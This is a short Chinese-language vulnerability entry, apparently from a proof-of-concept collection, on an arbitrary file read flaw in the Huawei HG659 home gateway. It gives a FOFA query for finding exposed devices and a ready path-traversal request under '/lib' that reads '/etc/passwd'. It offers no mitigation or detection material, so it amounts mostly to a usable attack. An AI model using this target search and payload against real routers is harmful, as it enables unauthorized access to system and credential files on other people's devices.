# Huawei-HG659-lib-任意文件读取漏洞

## 漏洞描述

Huawei HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件

## 漏洞影响

> [!NOTE]
>
> Huawei HG659 

## FOFA

> [!NOTE]
>
> app="HUAWEI-Home-Gateway-HG659"

## 漏洞复现

登录页面如下

![image-20210615141459903](Huawei-HG659-lib-任意文件读取漏洞.assets/1627363574526977.jpg)

POC如下

```
/lib///....//....//....//....//....//....//....//....//etc//passwd
```

![image-20210615141751249](Huawei-HG659-lib-任意文件读取漏洞.assets/1627363574731047.jpg)